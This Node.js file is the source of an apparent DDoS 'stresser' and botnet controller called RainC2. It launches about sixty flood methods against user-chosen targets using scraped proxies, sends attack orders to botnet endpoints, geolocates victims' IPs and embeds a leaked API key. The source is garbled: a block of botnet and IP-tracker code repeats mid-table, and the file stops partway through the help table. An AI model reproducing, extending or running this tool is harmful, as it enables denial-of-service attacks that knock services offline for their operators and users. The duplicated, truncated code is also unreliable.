#!/usr/bin/env node
/*  RainC2 – per-method switch-block edition  */
const { exec } = require('child_process');
const readline = require('readline');
const url = require('url');
const fs = require('fs');
const axios = require('axios');
const path = require('path');
const version = '1.0.0';
let processList = [];

/*  ----------  colours  ----------  */
const cyan = '\x1b[96m', bold = '\x1b[1m', kuning_emas = '\x1b[93m', Reset = '\x1b[0m',
      biru = '\x1b[36m', biru_terang = '\x1b[94m', biru_tua = '\x1b[38;2;0;0;139m',
      teksmerah = '\x1b[31m', teksungu = '\x1b[95m', hijau = '\x1b[38;2;144;238;144m',
      orange = '\x1b[38;2;255;165;0m';

/*  ----------  rl  ----------  */
const steven = readline.createInterface({ input: process.stdin, output: process.stdout });

/*  ----------  tiny utils  ----------  */
const sleep = ms => new Promise(r => setTimeout(r, ms));
const execPromise = cmd => new Promise((res, rej) => exec(cmd, (e, so, se) => e ? rej(e) : res(so)));

/*  ----------  banner  ----------  */
async function banner() {
  console.clear();
  console.log(`
${orange}Welcome User To RainC2 Tools${Reset}
${bold}${hijau}DEVELOPER: Stevee${Reset}
${bold}${biru_tua}VERSION: 1.0${Reset}
${bold}${biru_terang}Type 'Help' For Showing All Feature Command Tools RainC2${Reset}`);
}

/*  ----------  scrape proxy / ua  ----------  */
async function scrapeProxy() {
  try {
    const res = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
    fs.writeFileSync('proxy.txt', await res.text(), 'utf-8');
  } catch {}
}
async function scrapeUserAgent() {
  try {
    const res = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    fs.writeFileSync('ua.txt', await res.text(), 'utf-8');
  } catch {}
}

/*  ----------  bootup (no password)  ----------  */
async function bootup() {
  console.log('|| ▓░░░░░░░░░ || 10%');
  await execPromise(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent`);
  console.log('|| ▓▓▓▓▓▓▓▓▓▓ || 100%');
  await scrapeProxy();
  await scrapeUserAgent();
  await sleep(700);
  console.clear();
  console.log(`Welcome Guys To RainC2 Stresser Tools ${version}`);
  await sleep(1000);
  await banner();
  console.log('==========================================================================');
  sigma();
}

/*  ----------  dynamic method loader  ----------  */
const METHOD_FILES = [
  'black.js','blast.js','browser.js','bypass.js','cat.js','cf.js','chaptcha.js','cibi.js','cici.js','ciko.js','coki.js',
  'DeathPing.js','fire.js','flaybypass.js','flayingraw.js','flood.js','flood1.js','geckold.js','glory.js','god.js',
  'H2-MERIS.js','h2-raw.js','h2.js','httpx.js','kill-do.js','kill-wifi.js','maklo.js','mc.js','mixed.js','ninja.js',
  'pidoras.js','ping.js','quantum.js','raw.js','sad.js','sadboy.js','samp.js','spampair.js','steven.js','storm.js',
  'tcp.js','temp.js','thspeed.js','thunder.js','tls.js','uam.js','udp.js','xin.js','xyn.js','zeus-flash.js',
  'zeus-flood.js','zeus-love.js','zeus-raw.js','zeus-sad.js','zeus-steven.js','zeus-tls.js','zs-browser.js',
  'zs-bypass.js','zxm.js'
];
const METHODS = METHOD_FILES.map(f => path.basename(f, '.js').toLowerCase());

/*  ----------  complete 60+ method switch  ----------  */
async function legacyAttack(methods, target, port, duration) {
  const metode = path.join(__dirname, 'lib/cache', `${methods}.js`);

  if (methods === 'zeus-flood') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'zxm') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'ciko') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'zeus-love') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'glory') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'zeus-tls') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10`);
    return sigma();
  } else if (methods === 'xin') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'zs-browser') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10`);
    return sigma();
  } else if (methods === 'flayingraw') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10`);
    return sigma();
  } else if (methods === 'steven') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'zeus-steven') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'zeus-raw') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration}`);
    return sigma();
  } else if (methods === 'black') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10`);
    return sigma();
  } else if (methods === 'zeus-flash') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'ciko') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'zs-bypass') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'flaybypass') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'sad') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'ninja') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10`);
    return sigma();
  } else if (methods === 'flood1') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'zeus-sad') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'cici') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'cibi') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'chaptcha') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'cat') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'geckold') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'fire') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10`);
    return sigma();
  } else if (methods === 'mixed') {
    pushOngoing(target, methods, duration);
    const zeus_flash = path.join(__dirname, 'lib/cache/zeus-flash.js');
    const zs_bypass  = path.join(__dirname, 'lib/cache/zs-bypass.js');
    exec(`node ${zeus_flash} ${target} ${duration} 100 10 proxy.txt`);
    exec(`node ${zs_bypass}  ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'deathping') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10`);
    return sigma();
  } else if (methods === 'udp') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${port} ${duration}`);
    return sigma();
  } else if (methods === 'tcp') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${port} ${duration}`);
    return sigma();
  } else if (methods === 'ping') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} 66507 6 1 ${duration}`);
    return sigma();
  } else if (methods === 'h2') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10`);
    return sigma();
  } else if (methods === 'h2-raw') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10`);
    return sigma();
  } else if (methods === 'H2-MERIS') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10`);
    return sigma();
  } else if (methods === 'httpx') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'tls') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10`);
    return sigma();
  } else if (methods === 'uam') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10`);
    return sigma();
  } else if (methods === 'thunder') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10`);
    return sigma();
  } else if (methods === 'thspeed') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'temp') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'storm') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'steven') { // already above, keep for order
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'spampair') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'sadboy') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'samp') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${port} ${duration}`);
    return sigma();
  } else if (methods === 'mc') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${port} ${duration}`);
    return sigma();
  } else if (methods === 'kill-wifi') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'kill-do') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} 22 root ${duration}`);
    return sigma();
  } else if (methods === 'god') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'glory') { // already above, keep for order
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'geckold') { // already above
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'flood') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'flood1') { // already above
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'coki') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'ciko') { // already above
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'cici') { // already above
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'cibi') { // already above
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'cat') { // already above
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'chaptcha') { // already above
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'cf') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'browser') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'blast') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'black') { // already above
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10`);
    return sigma();
  } else if (methods === 'quantum') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'raw') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'pidoras') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'maklo') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'kill-do') { // already above
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} 22 root ${duration}`);
    return sigma();
  } else if (methods === 'zeus-flash') { // already above
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'zeus-love') { // already above
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'zeus-sad') { // already above
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'zeus-steven') { // already above
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'zeus-tls') { // already above
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10`);
    return sigma();
  } else if (methods === 'zeus-flood') { // already above
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'zeus-raw') { // already above
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration}`);
    return sigma();
  } else if (methods === 'zs-browser') { // already above
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10`);
    return sigma();
  } else if (methods === 'zs-bypass') { // already above
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'zxm') { // already above
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'xin') { // already above
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  } else if (methods === 'xyn') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    return sigma();
  }

  /*  if somehow still not caught  */
  console.log(`Methods ${methods} Is Not Recognized In List RainC2.`);
  sigma();
}

/*  ----------  attack wrapper (generic fallback)  ----------  */
async function handleAttack(method, args) {
  if (args.length < 3) {
    console.log(`Example: ${method} <Target> <Port> <Duration>\n${method} https://google.com  443 120`);
    return sigma();
  }
  const [target, port, duration] = args;
  try {
    const parsing = new url.URL(target);
    const hostname = parsing.hostname;
    const { data: result } = await axios.get(`http://ip-api.com/json/ ${hostname}?fields=isp,query,as`);
    console.clear();
    console.log(`
                              ⣿                             
                             ⣿⣿⣿                            
                           ⣿⣿⣿⣿⣿⣿                       
                         ⣿⣿⣿⣿⣿⣿⣿⣿⣿                       
                        ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿               
                      ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿                 
                     ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿               
                   ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿           
                  ⣿⣿⣿ ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿           
                 ⣿⣿⣿ ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿           
                ⣿⣿⣿  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿               
                ⣿⣿⣿  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿             
               ⣿⣿⣿⣿  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿              
               ⣿⣿⣿⣿  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿           
                ⣿⣿⣿   ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿             
                 ⣿⣿⣿⣿  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿            
                   ⣿⣿⣿⣿  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿       
                     ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿          
                         ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
${bold}${cyan}Attack Has Been Launched${Reset}
========================================================================
${bold}${cyan}STATUS${Reset}   : \x1b[94mAttack Has Successfully Launched\x1b[0m
${bold}${cyan}Target${Reset}   : ${target}
${bold}${cyan}Duration${Reset} : ${duration}
${bold}${cyan}Methods${Reset}  : ${method}
${bold}${cyan}ISP${Reset}      : ${result.isp}
${Reset}Ip${Reset}       : ${result.query}
${bold}${cyan}AS${Reset}       : ${result.as}
`);
  } catch (e) {
    console.log(`Oops Something Went Wrong`);
    return sigma();
  }
  const mod = path.join(__dirname, 'lib/cache', `${method}.js`);
  exec(`node ${mod} ${target} ${duration} 65 10 proxy.txt`);
  sigma();
}

/*  ----------  push / list on-going  ----------  */
function pushOngoing(target, method, duration) {
  const start = Date.now();
  processList.push({ target, method, start, duration });
  setTimeout(() => {
    const idx = processList.findIndex(p => p.method === method);
    if (idx !== -1) processList.splice(idx, 1);
  }, duration * 1000);
}
function ongoingAttack() {
  console.log('\nOngoing Attacks:\n');
  processList.forEach(p => {
    console.log(`Target: ${p.target}\nMethod: ${p.method}\nDuration: ${p.duration}s\nSince: ${Math.floor((Date.now() - p.start) / 1000)}s ago\n`);
  });
}

/*  ----------  botnet endpoints  ----------  */
async function AttackBotnetEndpoints(args) {
  if (args.length < 3) {
    console.log(`Example: botnet <Target> <Duration> <Method>\nbotnet https://google.com  120 zeus-flood`);
    return sigma();
  }
  const [target, duration, methods] = args;
  let botnetData, successCount = 0;
  const timeout = 20000, validEndpoints = [];
  try {
    botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
  } catch {
    botnetData = { endpoints: [] };
  }
  const requests = botnetData.endpoints.map(async ep => {
    try {
      const { status } = await axios.get(`${ep}?target=${target}&time=${duration}&methods=${methods}`, { timeout });
      if (status === 200) { successCount++; validEndpoints.push(ep); }
    } catch {}
  });
  await Promise.all(requests);
  botnetData.endpoints = validEndpoints;
  try { fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2)); } catch {}
  console.log(`Sent to ${successCount} bot(s).`);
  sigma();
}

async function processBotnetEndpoint(args) {
  if (args.length < 1) {
    console.log(`Example: addsrv <Endpoint>\naddsrv http://1.1.1.1:2000/zeusnet `);
    return sigma();
  }
  const raw = args[0];
  try {
    const u = new url.URL(raw);
    const endpoint = `http://${u.host}/zeusnet`;
    let botnetData = { endpoints: [] };
    try { botnetData = JSON.parse(await fs.promises.readFile('./lib/botnet.json', 'utf8')); } catch {}
    if (botnetData.endpoints.includes(endpoint)) return console.log('Endpoint already listed.');
    botnetData.endpoints.push(endpoint);
    await fs.promises.writeFile('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    console.log(`Added ${endpoint}`);
  } catch { console.log('Bad endpoint URL.'); }
  sigma();
}

async function checkBotnetEndpoints() {
  let botnetData = { endpoints: [] };
  try { botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8')); } catch {}
  const timeout = 20000, valid = [];
  const checks = botnetData.endpoints.map(async ep => {
    try {
      const { status } = await axios.get(`${ep}?target=https://google.com&time=1&methods=ninja `, { timeout });
      if (status === 200) valid.push(ep);
    } catch {}
  });
  await Promise.all(checks);
  try { fs.writeFileSync('./lib/botnet.json', JSON.stringify({ endpoints: valid }, null, 2)); } catch {}
  console.log(`${valid.length}/${botnetData.endpoints.length} bot(s) online.`);
  sigma();
}

/*  ----------  IP tracker  ----------  */
async function trackIP(args) {
  if (args.length < 1) {
    console.log(`Example: track-ip <IP>\ntrack-ip 1.1.1.1`);
    return sigma();
  }
  const [target] = args;
  if (target === '0.0.0.0') return console.log('Nice try.'), sigma();
  try {
    const [geo, who] = await Promise.all([
      axios.get(`https://api.ipgeolocation.io/ipgeo?apiKey=8fd0a436e74f44a7a3f94edcdd71c696&ip=${target}`),
      axios.get(`https://ipwho.is/${target}`)
    ]);
    const g = geo.data, w = who.data;
    console.clear();
    console.log(`
Tracking IP Address Result
========================================================================
Flag : ${g.country_flag}
Country : ${g.country_name} | Capital : ${g.country_capital}
City : ${g.city} | ISP : ${g.isp} | Org : ${g.organization}
Lat : ${g.latitude} | Long : ${g.longitude}
Google Maps : https://www.google.com/maps/place/${w.latitude}+${w.longitude}`);
  } catch {
    console.log('IP lookup failed.');
  }
  sigma();
}

/*  ----------  command router  ----------  */
async function sigma() {
  steven.question('\x1b[91mR\x1b[93ma\x1b[92mi\x1b[96mn\x1b[94mC\x1b[95m2\x1b[0m ', async input => {
    const [cmd, ...args] = input.trim().split(/\s+/);
    const command = cmd.toLowerCase();

    if (command === 'help') {
      console.log(`
NAME      │ ALIAS              │ DESCRIPTION
──────────┼────────────────────┼────────────────────────────────────
 help     │ ----               │ Show all commands
 methods  │ ----               │ List all attack methods
 proxy    │ ----               │ Update proxy list
 ongoing  │ ----               │ View running attacks
 cls      │ ----               │ Clear terminal
 udp      │ <T> <P> <D>        │ UDP flood
 tcp      │ <T> <P> <D>        │ TCP flood
mc        │ <T> <P> <D>        │ Minecraft flood
samp      │ <T> <P> <D>        │ SA-MP flood
zeus-tls  │ <T> <P> <D>        │ Zeus TLS
zeus-flood│ <T> <P> <D>        │ Zeus flood
zeus-love │ <T> <P> <D>        │ Zeus love
zeus-raw  │ <T> <P> <D>        │ Zeus raw
zeus-sad  │ <T> <P> <D>        │ Zeus sad
zeus-flash│ <T> <P> <D>        │ Zeus flash
zs-browser│ <T> <P> <D>        │ ZS browser
zs-bypass │ <T> <P> <D>        │ ZS bypass
black     │ <T> <P> <D>        │ Black flood
blast     │ <T> <P> <D>        │ Blast flood
browser   │ <T> <P> <D>        │ Browser flood
bypass    │ <T> <P> <D>        │ Bypass flood
cat       │ <T> <P> <D>        │ Cat flood
cf        │ <T> <P> <D>        │ CF flood
chaptcha  │ <T> <P> <D>        │ Chaptcha flood
cibi      │ <T> <P> <D>        │ Cibi flood
cici      │ <T> <P> <D>        │ Cici flood
ciko      │ <T> <P> <D>        │ Ciko flood
coki      │ <T> <P> <D>        │ Coki flood
deathping │ <T> <P> <D>        │ Death ping
fire      │ <T> <P> <D>        │ Fire flood
flaybypass│ <T> <P> <D>        │ Flay bypass
flayingraw│ <T> <P> <D>        │ Flaying raw
flood     │ <T> <P> <D>        │ Flood
flood1    │ <T> <P> <D>        │ Flood-1
geckold   │ <T> <P> <D>        │ Geckold
glory     │ <T> <P> <D>        │ Glory flood
god       │ <T> <P> <D>        │ God flood
h2        │ <T> <P> <D>        │ H2 flood
h2-raw    │ <T> <P> <D>        │ H2 raw
H2-MERIS  │ <T> <P> <D>        │ H2 Meris
httpx     │ <T> <P> <D>        │ HTTPX flood
kill-do   │ <T> <P> <D>        │ Kill DO
kill-wifi │ <T> <P> <D>        │ Kill WiFi
maklo     │ <T> <P> <D>        │ Maklo flood
mixed     │ <T> <P> <D>        │ Mixed flood
ninja     │ <T> <P> <D>        │ Ninja flood
pidoras   │ <T> <P> <D>        │ Pidoras flood
ping      │ <T> <P> <D>        │ Ping flood
quantum   │ <T> <P> <D>        │ Quantum flood
raw       │ <T> <P> <D>        │ Raw flood
sad       │ <T> <P> <D>        │ Sad flood
sadboy    │ <T> <P> <D>        │ Sadboy flood
spampair  │ <T> <P> <D>        │ Spam pair
steven    │ <T> <P> <D>        │ Steven flood
storm     │ <T> <P> <D>        │ Storm flood
temp      │ <T> <P> <D>        │ Temp flood
thspeed   │ <T> <P> <D>        │ TH speed
thunder   │ <T> <P> <D>        │ Thunder flood
tls       │ <T> <P> <D>        │ TLS flood
uam       │ <T> <P> <D>        │ UAM flood
 validEndpoints = [];
  try {
    botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
  } catch {
    botnetData = { endpoints: [] };
  }
  const requests = botnetData.endpoints.map(async ep => {
    try {
      const { status } = await axios.get(`${ep}?target=${target}&time=${duration}&methods=${methods}`, { timeout });
      if (status === 200) { successCount++; validEndpoints.push(ep); }
    } catch {}
  });
  await Promise.all(requests);
  botnetData.endpoints = validEndpoints;
  try { fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2)); } catch {}
  console.log(`Sent to ${successCount} bot(s).`);
  sigma();
}

async function processBotnetEndpoint(args) {
  if (args.length < 1) {
    console.log(`Example: addsrv <Endpoint>\naddsrv http://1.1.1.1:2000/zeusnet `);
    return sigma();
  }
  const raw = args[0];
  try {
    const u = new url.URL(raw);
    const endpoint = `http://${u.host}/zeusnet`;
    let botnetData = { endpoints: [] };
    try { botnetData = JSON.parse(await fs.promises.readFile('./lib/botnet.json', 'utf8')); } catch {}
    if (botnetData.endpoints.includes(endpoint)) return console.log('Endpoint already listed.');
    botnetData.endpoints.push(endpoint);
    await fs.promises.writeFile('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    console.log(`Added ${endpoint}`);
  } catch { console.log('Bad endpoint URL.'); }
  sigma();
}

async function checkBotnetEndpoints() {
  let botnetData = { endpoints: [] };
  try { botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8')); } catch {}
  const timeout = 20000, valid = [];
  const checks = botnetData.endpoints.map(async ep => {
    try {
      const { status } = await axios.get(`${ep}?target=https://google.com&time=1&methods=ninja `, { timeout });
      if (status === 200) valid.push(ep);
    } catch {}
  });
  await Promise.all(checks);
  try { fs.writeFileSync('./lib/botnet.json', JSON.stringify({ endpoints: valid }, null, 2)); } catch {}
  console.log(`${valid.length}/${botnetData.endpoints.length} bot(s) online.`);
  sigma();
}

/*  ----------  IP tracker  ----------  */
async function trackIP(args) {
  if (args.length < 1) {
    console.log(`Example: track-ip <IP>\ntrack-ip 1.1.1.1`);
    return sigma();
  }
  const [target] = args;
  if (target === '0.0.0.0') return console.log('Nice try.'), sigma();
  try {
    const [geo, who] = await Promise.all([
      axios.get(`https://api.ipgeolocation.io/ipgeo?apiKey=8fd0a436e74f44a7a3f94edcdd71c696&ip= ${target}`),
      axios.get(`https://ipwho.is/ ${target}`)
    ]);
    const g = geo.data, w = who.data;
    console.clear();
    console.log(`
Tracking IP Address Result
========================================================================
Flag : ${g.country_flag}
Country : ${g.country_name} | Capital : ${g.country_capital}
City : ${g.city} | ISP : ${g.isp} | Org : ${g.organization}
Lat : ${g.latitude} | Long : ${g.longitude}
Google Maps : https://www.google.com/maps/place/ ${w.latitude}+${w.longitude}`);
  } catch {
    console.log('IP lookup failed.');
  }
  sigma();
}

/*  ----------  command router  ----------  */
async function sigma() {
  steven.question('\x1b[91mR\x1b[93ma\x1b[92mi\x1b[96mn\x1b[94mC\x1b[95m2\x1b[0m ', async input => {
    const [cmd, ...args] = input.trim().split(/\s+/);
    const command = cmd.toLowerCase();

    if (command === 'help') {
      console.log(`
NAME      │ ALIAS              │ DESCRIPTION
──────────┼────────────────────┼────────────────────────────────────
 help     │ ----               │ Show all commands
 methods  │ ----               │ List all attack methods
 proxy    │ ----               │ Update proxy list
 ongoing  │ ----               │ View running attacks
 cls      │ ----               │ Clear terminal
 udp      │ <T> <P> <D>        │ UDP flood
 tcp      │ <T> <P> <D>        │ TCP flood
mc        │ <T> <P> <D>        │ Minecraft flood
samp      │ <T> <P> <D>        │ SA-MP flood
zeus-tls  │ <T> <P> <D>        │ Zeus TLS
zeus-flood│ <T> <P> <D>        │ Zeus flood
zeus-love │ <T> <P> <D>        │ Zeus love
zeus-raw  │ <T> <P> <D>        │ Zeus raw
zeus-sad  │ <T> <P> <D>        │ Zeus sad
zeus-flash│ <T> <P> <D>        │ Zeus flash
zs-browser│ <T> <P> <D>        │ ZS browser
zs-bypass │ <T> <P> <D>        │ ZS bypass
black     │ <T> <P> <D>        │ Black flood
blast     │ <T> <P> <D>        │ Blast flood
browser   │ <T> <P> <D>        │ Browser flood
bypass    │ <T> <P> <D>        │ Bypass flood
cat       │ <T> <P> <D>        │ Cat flood
cf        │ <T> <P> <D>        │ CF flood
chaptcha  │ <T> <P> <D>        │ Chaptcha flood
